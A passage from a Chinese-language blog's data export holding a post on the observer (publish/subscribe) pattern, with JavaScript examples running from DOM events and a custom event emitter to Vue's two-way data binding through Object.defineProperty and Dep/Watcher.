PipeImg().show();`。问题在于，由于待编辑图片加载是异步的，需要图片 load 完成再调用 show 方法才有效。也就是先报名（订阅），然后等通知（发布）。这不正是我们说的订阅/发布模式（观察者模式）吗？\n\n示例代码\n\n```js\n...\n  methods: [],\n\n  show: function(params) {\n    this.methods.push({\n      name: \"show\",\n      params: params\n    });\n  },\n  exec: function() {\n    for (var i = 0; i < this.methods.length; i++) {\n      var element = this.methods[i];\n      this[\"_\" + element.name](element.params);\n    }\n    this.methods = [];\n  },\n  _show: function(){\n    // 真正的实现代码\n  },\n  init: function(){\n    var image = new Image();\n    image.src = 'xxxx';\n    image.onload = function(){\n      this.exec();\n    }\n  }\n...\n\n```\n\n看了实际的案例，接下来我们系统学习下这个模式，了解其中的设计思想，总结一个通用方法。\n## 如此简单\n```js\ndiv.addEventListener('click', function(){\n  alert('hello');\n})\n```\n这个就是？基本思想就是这样：先注册事件，然后等到具体事件触发时执行回调函数。下面我们再给出一例：\n\n## 自定义事件\n\n```js\nvar Event = {\n  // 处理函数储存器\n  handlers: {},\n  // 绑定\n  on: function(type, fn) {\n    if (!this.handlers[type]) {\n      this.handlers[type] = [];\n    }\n    this.handlers[type].push(fn);\n  },\n  // 触发\n  trigger: function(type) {\n    for (var i = 0; i < this.handlers[type].length; i++) {\n      this.handlers[type][i]();\n    }\n  },\n  // 解除\n  off: function(type, fn) {\n    for (var i = 0; i < this.handlers[type].length; i++) {\n      if (this.handlers[type][i] === fn) {\n        // 移除给定的fn\n        this.handlers[type].splice(i, 1);\n      } else {\n        // 移除所有type类型的\n        this.handlers[type].length = 0;\n      }\n    }\n  }\n};\n\n// 测试\nEvent.on(\"test\", function() {\n  console.log(\"test first\");\n});\nEvent.on(\"test\", function() {\n  console.log(\"test second\");\n});\nEvent.trigger(\"test\");\nEvent.off('test');\nEvent.trigger(\"test\");\n// test first\n// test second\n```\n似曾相识？没错，就是类似jQuery的自定义事件。下面再抽象一个通用的：\n\n## 发布/订阅\n```js\n// 摘自《JavaScript模式》\nvar publisher = {\n  subscribers: {\n    any: [] //event type: subscribers\n  },\n  subscribe: function(fn, type) {\n    type = type || \"any\";\n    if (typeof this.subscribers[type] === \"undefined\") {\n      this.subscribers[type] = [];\n    }\n    this.subscribers[type].push(fn);\n  },\n  unsubscribe: function(fn, type) {\n    this.visitSubscribers('unsubscribe', fn, type);\n  },\n  publish: function(publication, type) {\n    this.visitSubscribers('publish', publication, type);\n  },\n  visitSubscribers: function(action, arg, type){\n    var pubtype = type || 'any',\n        subscribers = this.subscribers[pubtype];\n    for(var i=0; i< subscribers.length; i++){\n      if(action === 'publish'){\n        subscribers[i](arg);\n      }else{\n        if(subscribers[i] === arg){\n            subscribers.splice(i,1);\n        }\n      }\n    }\n  }\n\n};\n//定义一个函数makePublisher()，它接受一个对象作为对象，通过把上述通用发布者的方法复制到该对象中，从而将其转换为一个发布者\nfunction makePublisher(obj) {\n  for (var i in publisher) {\n    if (publisher.hasOwnProperty(i) && typeof publisher[i] === \"function\") {\n      obj[i] = publisher[i];\n    }\n  }\n  obj.subscribers = {any: []};\n}\n\n//实现一个发布者paper对象\nvar paper = {\n    daily: function(){\n        this.publish(\"big news today\");\n    },\n    monthly: function(){\n        this.publish(\"interesting analysis\",\"monthly\");\n    }\n};\n//将paper构造成一个发布者\nmakePublisher(paper);\n//实现一个订阅这joe对象\nvar joe = {\n  drinkCoffee: function(publication){\n    console.log('Just read ' + publication);\n  },\n  sundayPreNap: function(publication){\n    console.log('About to fall asleep reading this ' + publication);\n  }\n};\n//paper注册joe（即joe向paper订阅）\npaper.subscribe(joe.drinkCoffee);\npaper.subscribe(joe.sundayPreNap, 'monthly');\n//即joe为默认“any”事件提供了一个可被调用的方法，而另一个可被调用的方法则用于当“monthly”类型的事件发生时的情况。现在让我们来触发一些事件：\npaper.daily();      //Just read big news today\npaper.daily();      //Just read big news today\npaper.monthly();    //About to fall asleep reading this interesting analysis\npaper.monthly();    //About to fall asleep reading this interesting analysis\npaper.monthly();    //About to fall asleep reading this interesting analysis\n```\n## Vue中的使用\n### 关于数据双向绑定的理解\n- view ==> data，通过绑定事件实现；\n- data ==> view，通过获取dom元素赋值实现；\n- data <=> view，以上两者结合；\n关于vue对该模块的实现，请看以下两张图：\n实现过程：\n![图一](2.png)\n观察者模式实现：\n![图二](1.png)\n实现的示例代码：\n```js\n    Object.defineProperty(data, key, {\n      enumerable: true,\n      configurable: true,\n      get: function() {\n        if (Dep.target) {\n          // 添加一个订阅者watcher\n          dep.addSub(Dep.target);\n        }\n        return value;\n      },\n      // setter，如果对一个对象属性值改变，就会触发setter中的dep.notify(),通知watcher（订阅者）数据变更，执行对应订阅者的更新函数，来更新视图。\n      set: function(newVal) {\n        if (value === newVal) {\n          return;\n        }\n        value = newVal;\n        // 新的值是object的话，进行监听\n        childObj = observe(value);\n        // 发布\n        dep.notify();\n      }\n    })\n\nfunction Dep() { // 消息订阅器Dep，订阅器Dep主要负责收集订阅者，然后再属性变化的时候执行对应订阅者的更新函数\n  this.subs = [];\n}\nDep.prototype = {\n  //添加订阅者\n  addSub: function(sub) { \n    this.subs.push(sub);\n  },\n  // 发布通知\n  notify: function() {\n    this.subs.forEach(function(sub) {\n      sub.update();\n    })\n  }\n}\n```\n结合注释及流程图，对于该模式在其中的应用就很好理解了：订阅器为Dep类，实现两个实例方法添加订阅者（addSub）和发布通知（notify），其中订阅者为Watcher实例，主要方法为update，该方法实现了data数据更新及调用更新view的方法。至于何时添加订阅者（addSub）和发布通知（notify），这个就看具体使用主体的需要了。\n\nvue中的实现，核心就是通过数据劫持（Object.defineProperty），该方法实现了对象属性读取时会调用get方法，赋值时会调用set方法。这样，在get中调用addSub，set中调用notify，也就实现了数据更新时发布通知，告诉订阅器watcher去完成相关更新工作update，这就完成了从data => view的自动更新。至于从view => data，熟悉的dom事件绑定，就如我们开头说的，事件绑定也是观察者模式。\n\n参考：\n图一相关：http://www.cnblogs.com/libin-1/p/6893712.html\n图二相关：https://blog.csdn.net/github_36369819/article/details/79201314","source":"_posts/2019/02/2019-02-01-观察者模式.md","raw":"---\ntitle: 观察者模式--从事件绑定到Vue数据双向绑定\ntags:\n  - JavaScript\ncategories:\n  - 前端\ndate: 2019-02-01 10:21:06\nupdated: 2019-02-01 10:21:06\n---\n# 概述\n\n观察者(observer) 模式，也叫自定义事件(custom events)，也叫订阅/发布(subscriber/publisher)模式。其实日常很多地方都在用，只是没有意识到或者没有提炼出’观察者模式‘这个概念。例如，下面实践回顾中说的场景，jQuery中的自定义事件，Vue中的双向绑定，nodejs中的eventEmitter等。\n\n<!-- more -->\n\n# 详述\n\n## 实践回顾\n\n总结这个的起因是，最初在做一个图片编辑的 UI 组件（pipeImg），一个使用场景是：`new PipeImg().show();`。问题在于，由于待编辑图片加载是异步的，需要图片 load 完成再调用 show 方法才有效。也就是先报名（订阅），然后等通知（发布）。这不正是我们说的订阅/发布模式（观察者模式）吗？\n\n示例代码\n\n```js\n...\n  methods: [],\n\n  show: function(params) {\n    this.methods.push({\n      name: \"show\",\n      params: params\n    });\n  },\n  exec: function() {\n    for (var i = 0; i < this.methods.length; i++) {\n      var element = this.methods[i];\n      this[\"_\" + element.name](element.params);\n    }\n    this.methods = [];\n  },\n  _show: function(){\n    // 真正的实现代码\n  },\n  init: function(){\n    var image = new Image();\n    image.src = 'xxxx';\n    image.onload = function(){\n      this.exec();\n    }\n  }\n...\n\n```\n\n看了实际的案例，接下来我们系统学习下这个模式，了解其中的设计思想，总结一个通用方法。\n## 如此简单\n```js\ndiv.addEventListener('click', function(){\n  alert('hello');\n})\n```\n这个就是？基本思想就是这样：先注册事件，然后等到具体事件触发时执行回调函数。下面我们再给出一例：\n\n## 自定义事件\n\n```js\nvar Event = {\n  // 处理函数储存器\n  handlers: {},\n  // 绑定\n  on: function(type, fn) {\n    if (!this.handlers[type]) {\n      this.handlers[type] = [];\n    }\n    this.handlers[type].push(fn);\n  },\n  // 触发\n  trigger: function(type) {\n    for (var i = 0; i < this.handlers[type].length; i++) {\n      this.handlers[type][i]();\n    }\n  },\n  // 解除\n  off: function(type, fn) {\n    for (var i = 0; i < this.handlers[type].length; i++) {\n      if (this.handlers[type][i] === fn) {\n        // 移除给定的fn\n        this.handlers[type].splice(i, 1);\n      } else {\n        // 移除所有type类型的\n        this.handlers[type].length = 0;\n      }\n    }\n  }\n};\n\n// 测试\nEvent.on(\"test\", function() {\n  console.log(\"test first\");\n});\nEvent.on(\"test\", function() {\n  console.log(\"test second\");\n});\nEvent.trigger(\"test\");\nEvent.off('test');\nEvent.trigger(\"test\");\n// test first\n// test second\n```\n似曾相识？没错，就是类似jQuery的自定义事件。下面再抽象一个通用的：\n\n## 发布/订阅\n```js\n// 摘自《JavaScript模式》\nvar publisher = {\n  subscribers: {\n    any: [] //event type: subscribers\n  },\n  subscribe: function(fn, type) {\n    type = type || \"any\";\n    if (typeof this.subscribers[type] === \"undefined\") {\n      this.subscribers[type] = [];\n    }\n    this.subscribers[type].push(fn);\n  },\n  unsubscribe: function(fn, type) {\n    this.visitSubscribers('unsubscribe', fn, type);\n  },\n  publish: function(publication, type) {\n    this.visitSubscribers('publish', publication, type);\n  },\n  visitSubscribers: function(action, arg, type){\n    var pubtype = type || 'any',\n        subscribers = this.subscribers[pubtype];\n    for(var i=0; i< subscribers.length; i++){\n      if(action === 'publish'){\n        subscribers[i](arg);\n      }else{\n        if(subscribers[i] === arg){\n            subscribers.splice(i,1);\n        }\n      }\n    }\n  }\n\n};\n//定义一个函数makePublisher()，它接受一个对象作为对象，通过把上述通用发布者的方法复制到该对象中，从而将其转换为一个发布者\nfunction makePublisher(obj) {\n  for (var i in publisher) {\n    if (publisher.hasOwnProperty(i) && typeof publisher[i] === \"function\") {\n      obj[i] = publisher[i];\n    }\n  }\n  obj.subscribers = {any: []};\n}\n\n//实现一个发布者paper对象\nvar paper = {\n    daily: function(){\n        this.publish(\"big news today\");\n    },\n    monthly: function(){\n        this.publish(\"interesting analysis\",\"monthly\");\n    }\n};\n//将paper构造成一个发布者\nmakePublisher(paper);\n//实现一个订阅这joe对象\nvar joe = {\n  drinkCoffee: function(publication){\n    console.log('Just read ' + publication);\n  },\n  sundayPreNap: function(publication){\n    console.log('About to fall asleep reading this ' + publication);\n  }\n};\n//paper注册joe（即joe向paper订阅）\npaper.subscribe(joe.drinkCoffee);\npaper.subscribe(joe.sundayPreNap, 'monthly');\n//即joe为默认“any”事件提供了一个可被调用的方法，而另一个可被调用的方法则用于当“monthly”类型的事件发生时的情况。现在让我们来触发一些事件：\npaper.daily();      //Just read big news today\npaper.daily();      //Just read big news today\npaper.monthly();    //About to fall asleep reading this interesting analysis\npaper.monthly();    //About to fall asleep reading this interesting analysis\npaper.monthly();    //About to fall asleep reading this interesting analysis\n```\n## Vue中的使用\n### 关于数据双向绑定的理解\n- view ==> data，通过绑定事件实现；\n- data ==> view，通过获取dom元素赋值实现；\n- data <=> view，以上两者结合；\n关于vue对该模块的实现，请看以下两张图：\n实现过程：\n![图一](2.png)\n观察者模式实现：\n![图二](1.png)\n实现的示例代码：\n```js\n    Object.defineProperty(data, key, {\n      enumerable: true,\n      configurable: true,\n      get: function() {\n        if (Dep.target) {\n          // 添加一个订阅者watcher\n          dep.addSub(Dep.target);\n        }\n        return value;\n      },\n      // setter，如果对一个对象属性值改变，就会触发setter中的dep.notify(),通知watcher（订阅者）数据变更，执行对应订阅者的更新函数，来更新视图。\n      set: function(newVal) {\n        if (value === newVal) {\n          return;\n        }\n        value = newVal;\n        // 新的值是object的话，进行监听\n        childObj = observe(value);\n        // 发布\n        dep.notify();\n      }\n    })\n\nfunction Dep() { // 消息订阅器Dep，订阅器Dep主要负责收集订阅者，然后再属性变化的时候执行对应订阅者的更新函数\n  this.subs = [];\n}\nDep.prototype = {\n  //添加订阅者\n  addSub: function(sub) { \n    this.subs.push(sub);\n  },\n  // 发布通知\n  notify: function() {\n    this.subs.forEach(function(sub) {\n      sub.update();\n    })\n  }\n}\n```\n结合注释及流程图，对于该模式在其中的应用就很好理解了：订阅器为Dep类，实现两个实例方法添加订阅者（addSub）和发布通知（notify），其中订阅者为Watcher实例，主要方法为update，该方法实现了data数据更新及调用更新view的方法。至于何时添加订阅者（addSub）和发布通知（notify），这个就看具体使用主体的需要了。\n\nvue中的实现，核心就是通过数据劫持（Object.defineProperty），该方法实现了对象属性读取时会调用get方法，赋值时会调用set方法。这样，在get中调用addSub，set中调用notify，也就实现了数据更新时发布通知，告诉订阅器watcher去完成相关更新工作update，这就完成了从data => view的自动更新。至于从view => data，熟悉的dom事件绑定，就如我们开头说的，事件绑定也是观察者模式。\n\n参考：\n图一相关：http://www.cnblogs.com/libin-1/p/6893712.html\n图二相关：https://blog.csdn.net/github_36369819/article/details/79201314","slug":"2019-02-01-观察者模式","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8xa005dwovv1pmg1qmt","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>观察者(observer) 模式，也叫自定义事件(custom events)，也叫订阅/发布(subscriber/publisher)模式。其实日常很多地方都在用，只是没有意识到或者没有提炼出’观察者模式‘这个概念。例如，下面实践回顾中说的场景，jQuery中的自定义事件，Vue中的双向绑定，nodejs中的eventEmitter等。</p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"实践回顾\"><a href=\"#实践回顾\" class=\"headerlink\" title=\"实践回顾\"></a>实践回顾</h2><p>总结这个的起因是，最初在做一个图片编辑的 UI 组件（pipeImg），一个使用场景是：<code>new PipeImg().show();</code>。问题在于，由于待编辑图片加载是异步的，需要图片 load 完成再调用 show 方法才有效。也就是先报名（订阅），然后等通知（发布）。这不正是我们说的订阅/发布模式（观察者模式）吗？</p>\n<p>示例代码</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">  methods: [],</span><br><span class=\"line\"></span><br><span class=\"line\">  show: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">params</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.methods.push(&#123;</span><br><span class=\"line\">      name: <span class=\"string\">\"show\"</span>,</span><br><span class=\"line\">      params: params</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  exec: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"keyword\">this</span>.methods.length; i++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">var</span> element = <span class=\"keyword\">this</span>.methods[i];</span><br><span class=\"line\">      <span class=\"keyword\">this</span>[<span class=\"string\">\"_\"</span> + element.name](element.params);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.methods = [];</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  _show: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 真正的实现代码</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  init: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> image = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\">    image.src = <span class=\"string\">'xxxx'</span>;</span><br><span class=\"line\">    image.onload = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.exec();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p>看了实际的案例，接下来我们系统学习下这个模式，了解其中的设计思想，总结一个通用方法。</p>\n<h2 id=\"如此简单\"><a href=\"#如此简单\" class=\"headerlink\" title=\"如此简单\"></a>如此简单</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">div.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">  alert(<span class=\"string\">'hello'</span>);</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<p>这个就是？基本思想就是这样：先注册事件，然后等到具体事件触发时执行回调函数。下面我们再给出一例：</p>\n<h2 id=\"自定义事件\"><a href=\"#自定义事件\" class=\"headerlink\" title=\"自定义事件\"></a>自定义事件</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> Event = &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 处理函数储存器</span></span><br><span class=\"line\">  handlers: &#123;&#125;,</span><br><span class=\"line\">  <span class=\"comment\">// 绑定</span></span><br><span class=\"line\">  on: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">type, fn</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"keyword\">this</span>.handlers[type]) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.handlers[type] = [];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.handlers[type].push(fn);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"comment\">// 触发</span></span><br><span class=\"line\">  trigger: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">type</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"keyword\">this</span>.handlers[type].length; i++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.handlers[type][i]();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"comment\">// 解除</span></span><br><span class=\"line\">  off: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">type, fn</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"keyword\">this</span>.handlers[type].length; i++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.handlers[type][i] === fn) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 移除给定的fn</span></span><br><span class=\"line\">        <span class=\"keyword\">this</span>.handlers[type].splice(i, <span class=\"number\">1</span>);</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 移除所有type类型的</span></span><br><span class=\"line\">        <span class=\"keyword\">this</span>.handlers[type].length = <span class=\"number\">0</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 测试</span></span><br><span class=\"line\">Event.on(<span class=\"string\">\"test\"</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"test first\"</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">Event.on(<span class=\"string\">\"test\"</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"test second\"</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">Event.trigger(<span class=\"string\">\"test\"</span>);</span><br><span class=\"line\">Event.off(<span class=\"string\">'test'</span>);</span><br><span class=\"line\">Event.trigger(<span class=\"string\">\"test\"</span>);</span><br><span class=\"line\"><span class=\"comment\">// test first</span></span><br><span class=\"line\"><span class=\"comment\">// test second</span></span><br></pre></td></tr></table></figure>\n<p>似曾相识？没错，就是类似jQuery的自定义事件。下面再抽象一个通用的：</p>\n<h2 id=\"发布-订阅\"><a href=\"#发布-订阅\" class=\"headerlink\" title=\"发布/订阅\"></a>发布/订阅</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 摘自《JavaScript模式》</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> publisher = &#123;</span><br><span class=\"line\">  subscribers: &#123;</span><br><span class=\"line\">    any: [] <span class=\"comment\">//event type: subscribers</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  subscribe: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">fn, type</span>) </span>&#123;</span><br><span class=\"line\">    type = type || <span class=\"string\">\"any\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> <span class=\"keyword\">this</span>.subscribers[type] === <span class=\"string\">\"undefined\"</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.subscribers[type] = [];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.subscribers[type].push(fn);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  unsubscribe: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">fn, type</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.visitSubscribers(<span class=\"string\">'unsubscribe'</span>, fn, type);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  publish: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">publication, type</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.visitSubscribers(<span class=\"string\">'publish'</span>, publication, type);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  visitSubscribers: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">action, arg, type</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> pubtype = type || <span class=\"string\">'any'</span>,</span><br><span class=\"line\">        subscribers = <span class=\"keyword\">this</span>.subscribers[pubtype];</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i=<span class=\"number\">0</span>; i&lt; subscribers.length; i++)&#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span>(action === <span class=\"string\">'publish'</span>)&#123;</span><br><span class=\"line\">        subscribers[i](arg);</span><br><span class=\"line\">      &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(subscribers[i] === arg)&#123;</span><br><span class=\"line\">            subscribers.splice(i,<span class=\"number\">1</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"comment\">//定义一个函数makePublisher()，它接受一个对象作为对象，通过把上述通用发布者的方法复制到该对象中，从而将其转换为一个发布者</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">makePublisher</span>(<span class=\"params\">obj</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i <span class=\"keyword\">in</span> publisher) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (publisher.hasOwnProperty(i) &amp;&amp; <span class=\"keyword\">typeof</span> publisher[i] === <span class=\"string\">\"function\"</span>) &#123;</span><br><span class=\"line\">      obj[i] = publisher[i];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  obj.subscribers = &#123;<span class=\"attr\">any</span>: []&#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//实现一个发布者paper对象</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> paper = &#123;</span><br><span class=\"line\">    daily: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.publish(<span class=\"string\">\"big news today\"</span>);</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    monthly: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.publish(<span class=\"string\">\"interesting analysis\"</span>,<span class=\"string\">\"monthly\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"comment\">//将paper构造成一个发布者</span></span><br><span class=\"line\">makePublisher(paper);</span><br><span class=\"line\"><span class=\"comment\">//实现一个订阅这joe对象</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> joe = &#123;</span><br><span class=\"line\">  drinkCoffee: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">publication</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'Just read '</span> + publication);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  sundayPreNap: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">publication</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'About to fall asleep reading this '</span> + publication);</span><br><span class=\"line\">  &#125;</span><br><span 